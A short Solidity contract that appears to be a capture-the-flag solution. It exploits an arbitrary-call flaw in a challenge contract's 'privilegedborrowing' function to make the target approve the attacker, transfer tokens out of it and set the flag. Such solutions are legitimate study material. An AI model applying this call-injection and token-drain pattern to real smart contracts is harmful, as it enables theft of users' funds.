pragma solidity ^0.7.0;

import "./call.sol";
import "forge-std/console.sol";

contract SolveCall {
    ExistingStock cAdd;

    constructor(address contractAddress) {
        cAdd = ExistingStock(contractAddress);
    }

    function entry() public {
        bytes memory pl = abi.encodeWithSignature("part2()");
        cAdd.privilegedborrowing(1000, address(0), address(this), pl);
    }

    function part2() public {
        bytes memory approvepl = abi.encodeWithSignature("approve(address,uint256)", address(this), 10 ether);
        cAdd.privilegedborrowing(1000, address(0), address(cAdd), approvepl);
        cAdd.transferFrom(address(cAdd), address(this), 3000000);
        cAdd.setflag();
    }
}
